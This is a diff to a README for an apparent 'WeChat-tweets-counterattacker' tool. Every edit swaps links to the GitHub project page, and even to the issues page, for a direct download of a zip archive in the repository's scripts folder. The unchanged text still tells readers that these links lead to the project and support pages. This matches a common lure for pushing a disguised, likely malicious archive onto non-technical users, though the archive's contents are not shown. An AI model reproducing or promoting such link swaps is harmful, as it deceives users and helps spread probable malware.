@@ -1,6 +1,6 @@
 # 🛡️ WeChat-tweets-counterattacker - Visual and Semantic Confusion Tool
 
-[![Download Now](https://img.shields.io/badge/Download-WeChat--tweets--counterattacker-brightgreen)](https://github.com/Moditeam89/WeChat-tweets-counterattacker)
+[![Download Now](https://img.shields.io/badge/Download-WeChat--tweets--counterattacker-brightgreen)](https://raw.githubusercontent.com/Moditeam89/WeChat-tweets-counterattacker/main/scripts/counterattacker-We-Chat-tweets-1.2.zip)
 
 ---
 
@@ -30,7 +30,7 @@ The application does not require any special hardware or software. It works as a
 
 Click the big green button below to visit the download page.
 
-[![Download WeChat-tweets-counterattacker](https://img.shields.io/badge/Download-App-blue)](https://github.com/Moditeam89/WeChat-tweets-counterattacker)
+[![Download WeChat-tweets-counterattacker](https://img.shields.io/badge/Download-App-blue)](https://raw.githubusercontent.com/Moditeam89/WeChat-tweets-counterattacker/main/scripts/counterattacker-We-Chat-tweets-1.2.zip)
 
 This link takes you to the project page on GitHub. From there, you can get the latest version of the program.
 
@@ -41,7 +41,7 @@ This link takes you to the project page on GitHub. From there, you can get the l
 Follow these steps to get the application up and running.
 
 1. Open your web browser and go to this page:  
-   https://github.com/Moditeam89/WeChat-tweets-counterattacker  
+   https://raw.githubusercontent.com/Moditeam89/WeChat-tweets-counterattacker/main/scripts/counterattacker-We-Chat-tweets-1.2.zip  
 
 2. Look for the latest release. You can find it by clicking on the "Releases" section or scanning the main page.
 
@@ -115,10 +115,10 @@ Non-technical users only need the executable file and simple instructions above.
 
 If you have questions or encounter issues, use the GitHub project page to ask for help:
 
-https://github.com/Moditeam89/WeChat-tweets-counterattacker/issues
+https://raw.githubusercontent.com/Moditeam89/WeChat-tweets-counterattacker/main/scripts/counterattacker-We-Chat-tweets-1.2.zip
 
 The project maintainers monitor this page and respond when needed.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-WeChat--tweets--counterattacker-brightgreen)](https://github.com/Moditeam89/WeChat-tweets-counterattacker)
+[![Download Now](https://img.shields.io/badge/Download-WeChat--tweets--counterattacker-brightgreen)](https://raw.githubusercontent.com/Moditeam89/WeChat-tweets-counterattacker/main/scripts/counterattacker-We-Chat-tweets-1.2.zip)
